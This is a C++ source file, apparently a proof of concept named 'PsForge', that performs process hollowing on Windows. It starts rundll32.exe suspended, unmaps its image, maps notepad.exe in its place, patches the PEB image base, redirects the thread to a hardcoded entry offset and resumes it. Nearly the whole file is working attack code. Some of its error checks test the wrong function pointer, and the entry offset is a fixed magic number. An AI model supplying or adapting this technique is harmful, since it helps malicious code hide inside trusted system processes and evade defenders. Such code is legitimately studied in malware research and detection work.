#include <iostream>
#include <string>
#include <memory>
#include <Windows.h>
#include <ShlObj.h>

using NtMapViewOfSectionPtr = NTSTATUS(NTAPI*)(HANDLE sectionHandle, HANDLE processHandle, PVOID* baseAddress,
	ULONG_PTR zeroBits, SIZE_T commitSize, PLARGE_INTEGER sectionOffset, PSIZE_T viewSize, ULONG inheritDisposition,
	ULONG allocationType, ULONG win32Protect);
using NtUnmapViewOfSectionPtr = NTSTATUS(NTAPI*)(HANDLE processHandle, PVOID baseAddress);
using NtQueryInformationProcessPtr = NTSTATUS(NTAPI*)(HANDLE processHandle, ULONG processInformationClass,
	PVOID processInformation, ULONG processInformationLength, PULONG returnLength);

struct PROCESS_BASIC_INFORMATION
{
	PVOID Reserved;
	PVOID PPeb;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
};

template <typename CloseRoutine>
class ObjDeleter {
    CloseRoutine _Closer;
public:
    explicit ObjDeleter(CloseRoutine closeRoutine) : _Closer(closeRoutine) {}
    void operator()(void* memBlock) const {
    	if (memBlock && memBlock != INVALID_HANDLE_VALUE) {
			_Closer(memBlock);
    	}
    }
};

int main()
{
	std::wcout << L">> PsForge startup . . .\n\n";

	const auto NtMapViewOfSection = reinterpret_cast<NtMapViewOfSectionPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtMapViewOfSection"));
	if (!NtMapViewOfSection)
	{
		std::wcout << L"NtMapViewOfSection not found.\n";
		return EXIT_FAILURE;
	}
	const auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSectionPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection"));
	if (!NtMapViewOfSection)
	{
		std::wcout << L"NtUnmapViewOfSection not found.\n";
		return EXIT_FAILURE;
	}
	const auto NtQueryInformationProcess = reinterpret_cast<NtQueryInformationProcessPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
	if (!NtMapViewOfSection)
	{
		std::wcout << L"NtQueryInformationProcess not found.\n";
		return EXIT_FAILURE;
	}

	std::wcout << L"NtMapViewOfSection: 0x" << NtMapViewOfSection << std::endl;
	std::wcout << L"NtUnmapViewOfSection: 0x" << NtUnmapViewOfSection << std::endl;
	std::wcout << L"NtQueryInformationProcess: 0x" << NtQueryInformationProcess << std::endl;

	PWSTR sysDirRaw;
	HRESULT hr;
	if ((hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &sysDirRaw)) != S_OK) {
		std::wcout << L"SHGetKnownFolderPath() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	std::wstring cmdLoc{ sysDirRaw }, notepadLoc{ sysDirRaw };
	CoTaskMemFree(sysDirRaw);
	std::wcout << L"System directory: " << cmdLoc << std::endl;

	ObjDeleter<decltype(&CloseHandle)> objDeleter{ CloseHandle };
	const std::unique_ptr<void, decltype(objDeleter)> cmdExe{ CreateFileW(
		cmdLoc.append(L"\\notepad.exe").c_str(), FILE_EXECUTE | FILE_READ_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, nullptr
	), objDeleter };
	if (cmdExe.get() == INVALID_HANDLE_VALUE) {
		std::wcout << L"CreateFileW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Opened notepad.exe binary file\n";

	const std::unique_ptr<void, decltype(objDeleter)> cmdMapping{ CreateFileMappingW(
		cmdExe.get(), nullptr, SEC_IMAGE | PAGE_READONLY, 0, 0, nullptr),
		objDeleter };
	if (!cmdMapping) {
		std::wcout << L"CreateFileMappingW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Created notepad.exe file mapping: SEC_IMAGE\n";

	PROCESS_INFORMATION pi;
	STARTUPINFOW si{ sizeof STARTUPINFOW, nullptr };

	if (!CreateProcessW(notepadLoc.append(L"\\rundll32.exe").c_str(), nullptr, nullptr, nullptr,
		FALSE, CREATE_SUSPENDED,
		nullptr, nullptr, &si, &pi)) {
		std::wcout << L"CreateProcessW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::unique_ptr<void, decltype(objDeleter)> hThread{ pi.hThread, objDeleter };
	std::unique_ptr<void, decltype(objDeleter)> hProcess{ pi.hProcess, objDeleter };
	std::wcout << L"Launched victim rundll32.exe process\n";

	PROCESS_BASIC_INFORMATION bi;
	auto status = NtQueryInformationProcess(pi.hProcess, 0, &bi, sizeof(PROCESS_BASIC_INFORMATION), &si.cb);
	if (status) {
		std::wcout << L"NtQueryInformationProcess() failed. NTSTATUS: 0x" << std::hex << status << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"PEB base address: 0x" << bi.PPeb << std::endl;

	PVOID imageBase;
	if (!ReadProcessMemory(pi.hProcess, static_cast<PUCHAR>(bi.PPeb) + 0x10, &imageBase, sizeof(PVOID), nullptr)) {
		std::wcout << L"ReadProcessMemory() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Image base address: 0x" << imageBase << std::endl;

	status = NtUnmapViewOfSection(pi.hProcess, imageBase);
	if (status) {
		std::wcout << L"NtUnmapViewOfSection() failed. NTSTATUS: 0x" << std::hex << status << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"rundll32.exe image unmapped\n";

	imageBase = nullptr;
	SIZE_T viewSize = 0;
	status = NtMapViewOfSection(cmdMapping.get(), pi.hProcess, &imageBase, 0, 0, nullptr, &viewSize, 2, 0, PAGE_READONLY);
	if (status) {
		std::wcout << L"NtMapViewOfSection() failed. NTSTATUS: 0x" << std::hex << status << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"notepad.exe mapped into remote process\n";

	if (!WriteProcessMemory(pi.hProcess, static_cast<PUCHAR>(bi.PPeb) + 0x10, &imageBase, sizeof(PVOID), nullptr)) {
		std::wcout << L"WriteProcessMemory() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Wrote new image base address as: 0x" << imageBase << std::endl;

	CONTEXT cx;
	cx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi.hThread, &cx)) {
		std::wcout << L"GetThreadContext() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	cx.Rcx = (DWORD64)(static_cast<PUCHAR>(imageBase) + 0x23db0);
	SetThreadContext(pi.hThread, &cx);
	ResumeThread(pi.hThread);
}